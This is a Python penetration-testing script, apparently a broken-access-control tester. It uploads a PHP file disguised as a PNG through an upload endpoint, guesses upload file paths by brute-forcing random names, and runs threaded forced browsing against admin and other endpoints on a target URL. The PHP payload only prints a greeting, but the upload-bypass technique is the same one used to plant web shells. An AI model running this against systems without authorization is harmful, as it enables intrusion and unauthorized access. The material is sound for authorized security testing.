import requests
import argparse
from urllib.parse import urlparse
from colorama import init, Fore
import os
import random
import string
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

class BrokenAccessTester:
    def __init__(self, url, cookie=None, proxy=None):
        self.url = url
        self.cookie = cookie
        self.session = requests.Session()
        if cookie:
            cookie_dict = dict(item.split("=") for item in cookie.split(";") if "=" in item)
            self.session.cookies.update(cookie_dict)
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def send_request(self, target_url, method="GET", custom_headers=None, data=None, files=None):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        if custom_headers:
            headers.update(custom_headers)
        try:
            if method == "POST":
                response = self.session.post(target_url, headers=headers, data=data, files=files, verify=False, timeout=10)
            else:
                response = self.session.get(target_url, headers=headers, verify=False, timeout=10)
            return response.status_code, response.text, response.headers
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] Request failed: {e}")
            return None, None, None

    def is_access_denied(self, status, content):
        deny_keywords = ["Access Denied", "403 Forbidden", "Permission Denied", "Login Required"]
        return status in [403, 401, 302] or (content and any(keyword in content for keyword in deny_keywords))

    def upload_file(self, upload_endpoint, filename="test.php.png"):
        """Tạo và upload file .php.png giả lập."""
        print(f"{Fore.YELLOW}[*] Attempting to upload file: {filename}")
        parsed_url = urlparse(self.url)
        upload_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{upload_endpoint.lstrip('/')}"

        # Tạo tệp tạm thời
        php_content = b"<?php echo 'Hello from PHP'; ?>"
        files = { "file": (filename, php_content, "image/png") }  # Giả lập MIME type là hình ảnh
        data = {"submit": "Upload"}  # Giả định trường submit

        status, content, headers = self.send_request(upload_url, method="POST", files=files, data=data)
        if status:
            print(f"{Fore.GREEN}[+] Upload response status: {status}")
            print(f"Response Snippet: {content[:200]}...")
            # Giả định phản hồi chứa đường dẫn tệp
            if "uploads" in content:
                import re
                match = re.search(r"/uploads/[^\"']+", content)
                return match.group(0) if match else None
            return None
        else:
            print(f"{Fore.RED}[!] Upload failed")
            return None

    def test_file_upload_access(self, filename="test.php.png", attempts=10, etag_prefix="67cb1", etag_suffix_len=8, upload_endpoint=None):
        print(f"{Fore.YELLOW}[*] Testing file upload access for: {filename}")
        parsed_url = urlparse(self.url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

        # Nếu có upload endpoint, thử upload file trước
        uploaded_file_path = None
        if upload_endpoint:
            uploaded_file_path = self.upload_file(upload_endpoint, filename)
            if uploaded_file_path:
                print(f"{Fore.GREEN}[!] Uploaded file path: {uploaded_file_path}")
                target_url = f"{base_url}{uploaded_file_path}"
                status, content, _ = self.send_request(target_url)
                if status == 200 and not self.is_access_denied(status, content):
                    print(f"{Fore.GREEN}[!] File accessible at: {target_url}")
                    print(f"Response Snippet: {content[:200]}...")
                return

        # Nếu không upload hoặc upload thất bại, thử đoán ETag
        uploads_base = f"{base_url}/uploads/"
        for _ in range(attempts):
            random_suffix = ''.join(random.choices(string.hexdigits.lower(), k=etag_suffix_len))
            etag = f"{etag_prefix}{random_suffix}"
            target_url = f"{uploads_base}{etag}_{filename}"
            print(f"{Fore.CYAN}[*] Attempting URL: {target_url}")
            status, content, _ = self.send_request(target_url)
            if status:
                print(f"{Fore.GREEN}[+] Status: {status}")
                if status == 200 and not self.is_access_denied(status, content):
                    print(f"{Fore.GREEN}[!] Potential file found! URL: {target_url}")
                    print(f"Response Snippet: {content[:200]}...")
                else:
                    print(f"{Fore.RED}[-] Access denied or not found: {target_url}")
            else:
                print(f"{Fore.RED}[-] No response from: {target_url}")

    def test_forced_browsing(self, endpoints=None, endpoint_file=None, max_workers=5):
        if endpoint_file and os.path.exists(endpoint_file):
            with open(endpoint_file, "r") as f:
                endpoints = [line.strip() for line in f if line.strip()]
        elif not endpoints:
            endpoints = ["/admin", "/login.php", "/guestbook.php", "/search.php", "/uploads/"]

        parsed_url = urlparse(self.url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

        def check_endpoint(endpoint):
            target_url = f"{base_url}/{endpoint.lstrip('/')}"
            print(f"{Fore.CYAN}[*] Attempting URL: {target_url}")
            status, content, _ = self.send_request(target_url)
            if status:
                print(f"{Fore.GREEN}[+] Status: {status}")
                if status == 200 and not self.is_access_denied(status, content):
                    print(f"{Fore.GREEN}[!] Potential sensitive endpoint found: {endpoint}")
                    print(f"Response Snippet: {content[:200]}...")
                else:
                    print(f"{Fore.RED}[-] Access denied or not found: {endpoint}")
            else:
                print(f"{Fore.RED}[-] No response from: {endpoint}")

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            executor.map(check_endpoint, endpoints)

def validate_url(url):
    parsed = urlparse(url)
    if not parsed.scheme:
        url = "http://" + url
        parsed = urlparse(url)
    if not parsed.netloc:
        raise ValueError("Invalid URL: No domain specified")
    return url

def main():
    print(f"{Fore.BLUE}[*] Broken Access Control Tester ")
    
    url = input(f"{Fore.YELLOW}[?] Enter target URL: ").strip()
    try:
        url = validate_url(url)
    except ValueError as e:
        print(f"{Fore.RED}[!] {e}. Exiting...")
        return

    cookie = input(f"{Fore.YELLOW}[?] Enter session cookie (e.g., PHPSESSID=abc123, press Enter to skip): ").strip() or None

    parser = argparse.ArgumentParser(description="Broken Access Control Testing Tool")
    parser.add_argument("--file-access", action="store_true", help="Test access to uploaded files")
    parser.add_argument("--filename", default="test.php.png", help="Filename to test")
    parser.add_argument("--upload-endpoint", help="Endpoint to upload file (e.g., /upload.php)")
    parser.add_argument("--attempts", type=int, default=10, help="Number of ETag attempts")
    parser.add_argument("--etag-prefix", default="67cb1", help="ETag prefix")
    parser.add_argument("--forced-browsing", action="store_true", help="Test forced browsing")
    parser.add_argument("--endpoint-file", help="File containing list of endpoints")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    args = parser.parse_args()

    tester = BrokenAccessTester(url, cookie, proxy=args.proxy)

    if args.file_access or (not args.file_access and not args.forced_browsing and input("Run file access test? (y/n): ").lower() == 'y'):
        tester.test_file_upload_access(args.filename, attempts=args.attempts, etag_prefix=args.etag_prefix, upload_endpoint=args.upload_endpoint)

    if args.forced_browsing or (not args.file_access and not args.forced_browsing and input("Run forced browsing test? (y/n): ").lower() == 'y'):
        tester.test_forced_browsing(endpoint_file=args.endpoint_file, max_workers=args.threads)

if __name__ == "__main__":
    main()